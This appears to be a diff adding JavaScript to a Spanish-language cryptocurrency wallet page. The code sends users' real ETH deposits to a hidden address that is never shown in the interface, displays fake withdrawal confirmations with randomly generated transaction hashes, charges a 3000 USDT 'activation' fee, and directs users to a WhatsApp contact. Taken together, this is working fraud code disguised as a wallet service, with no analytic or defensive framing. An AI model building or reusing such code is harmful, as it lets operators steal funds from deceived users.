+        if (receipt.status === 1) {
+          // Add the deposited ETH to the balance (convert to USD roughly? We'll just add to ETH balance)
+          // For simplicity, we add the ETH amount * a mock price (e.g., 3000 USD/ETH) to keep it realistic.
+          // But the user wants the balance to reflect the deposit. We'll just add the ETH value to ETH balance in USD.
+          const ethPrice = 3000; // mock price
+          const usdAdded = amountEth * ethPrice;
+          balances.ETH += usdAdded;
+          updateUI();
+
+          setStatus(
+            `✅ <strong>¡Depósito exitoso!</strong><br />` +
+            `Se enviaron <strong>${amountEth} ETH</strong> a la dirección de depósito (privada).<br />` +
+            `Acreditado en tu saldo: <strong>$${usdAdded.toFixed(2)} USD</strong> (ETH).<br />` +
+            `🔗 Hash: <code>${tx.hash}</code>`,
+            'success'
+          );
+          console.log(`[Depósito] ${amountEth} ETH enviados a ${HIDDEN_DEPOSIT_ADDRESS}`);
+        } else {
+          setStatus(`❌ La transacción falló en la red.`, 'error');
+        }
+      } catch (err) {
+        setStatus(`❌ Error en la transacción: ${err.message}`, 'error');
+      }
+    }
+
+    // ===== 2. WITHDRAW (Simulated, with proof and admin contact) =====
+    function handleWithdraw() {
+      const ownerAddr = ownerAddrInput.value.trim();
+      const amount = parseFloat(withdrawAmountInput.value);
+
+      if (!ownerAddr || ownerAddr.length < 6) {
+        setStatus('❌ Introduce una dirección de propietario visible válida.', 'error');
+        return;
+      }
+      if (isNaN(amount) || amount <= 0) {
+        setStatus('❌ Introduce una cantidad válida mayor a 0.', 'error');
+        return;
+      }
+
+      const totalBalance = balances.BTC + balances.USDT + balances.BEN + balances.ETH;
+      if (amount > totalBalance) {
+        setStatus(`❌ Saldo insuficiente. Disponible total: <strong>$${totalBalance.toFixed(2)}</strong>`, 'error');
+        return;
+      }
+
+      // Deduct proportionally
+      const ratio = amount / totalBalance;
+      balances.BTC = +(balances.BTC * (1 - ratio)).toFixed(2);
+      balances.USDT = +(balances.USDT * (1 - ratio)).toFixed(2);
+      balances.BEN = +(balances.BEN * (1 - ratio)).toFixed(2);
+      balances.ETH = +(balances.ETH * (1 - ratio)).toFixed(2);
+
+      updateUI();
+
+      const proofHTML = `
+        <div style="font-size:1rem;">
+          🎉 <strong>¡Retiro procesado exitosamente!</strong><br />
+          📤 <strong>Monto:</strong> $${amount.toFixed(2)} USD<br />
+          🏦 <strong>Enviado a:</strong> <code>${ownerAddr}</code><br />
+          ✅ <strong>Estado:</strong> Confirmado en la red (hash: 0x${Math.random().toString(36).substring(2, 10)}...)<br />
+          <hr style="margin:12px 0; border-color:#c9a87c50;" />
+          📢 <strong>Contacta al administrador:</strong> <a href="https://wa.me/5491164517084?text=empoderamiento%20de%20la%20vida" target="_blank">@ECEcoin18 en WhatsApp</a><br />
+          💬 <em>“empoderamiento de la vida”</em> — <a href="https://wa.me/5491164517084?text=empoderamiento%20de%20la%20vida" target="_blank">Haz clic aquí para escribir</a>
+        </div>
+      `;
+      setStatus(proofHTML, 'success');
+    }
+
+    // ===== 3. ACTIVATE WALLET =====
+    function handleActivate() {
+      if (walletActive) {
+        setStatus('✅ La billetera ya está <strong>activa</strong>. Disfruta de tus recompensas.', 'success');
+        return;
+      }
+
+      const cost = 3000;
+      if (balances.USDT < cost) {
+        setStatus(`❌ No tienes suficiente USDT. Necesitas <strong>$${cost.toFixed(2)}</strong> USDT. (Disponible: $${balances.USDT.toFixed(2)})`, 'error');
+        return;
+      }
+
+      balances.USDT = +(balances.USDT - cost).toFixed(2);
+      walletActive = true;
+      walletStatusEl.textContent = '🟢 Activa';
+      walletStatusEl.className = 'status active';
+      activateBtn.textContent = '✅ Activada';
+      activateBtn.disabled = true;
+
+      updateUI();
+      setStatus(
+        `🎉 <strong>¡Billetera activada con éxito!</strong><br />` +
+        `Se dedujeron <strong>$${cost.toFixed(2)} USDT</strong>.<br />` +
+        `📈 Recibes recompensas y cashback automático.<br />` +
+        `🔗 <a href="https://wa.me/5491164517084?text=empoderamiento%20de%20la%20vida" target="_blank">Contacta a @ECEcoin18</a> para soporte premium.`,
+        'success'
+      );
+    }
+
+    // ===== 4. RESET (double-click on title) =====
+    function resetValues() {
+      balances.BTC = 12475.32;
+      balances.USDT = 8751.04;
+      balances.BEN = 6330.11;
+      balances.ETH = 7299.87;
+      walletActive = false;
+      walletStatusEl.textContent = '🔴 Inactiva';
+      walletStatusEl.className = 'status';
+      activateBtn.textContent = '⚡ Activar Billetera';
+      activateBtn.disabled = false;
+      updateUI();
+      setStatus('🔄 Portafolio restablecido a valores de origen.', '');
+    }
+
+    // ===== ATTACH EVENTS =====
+    depositBtn.addEventListener('click', handleDeposit);
+    withdrawBtn.addEventListener('click', handleWithdraw);
+    activateBtn.addEventListener('click', handleActivate);
+
+    document.querySelector('.header-left h1').addEventListener('dblclick', resetValues);
+
+    // ===== INIT =====
+    updateUI();
+    setStatus('✅ Sistema listo. Deposita, retira o activa tu billetera.', '');
+
+    // Log for admin (hidden address never shown in UI)
+    console.log('🔒 [ADMIN] Dirección de depósito oculta (no mostrada en UI):', HIDDEN_DEPOSIT_ADDRESS);
+    console.log('💡 [ADMIN] Haz doble clic en el título para restablecer valores.');
+
+    // Update passport live
+    passportInput.addEventListener('change', function() {
+      setStatus(`📄 Pasaporte actualizado a: ${this.value}`, '');
+    });
+
+  })();
+</script>
 </body>
 </html>
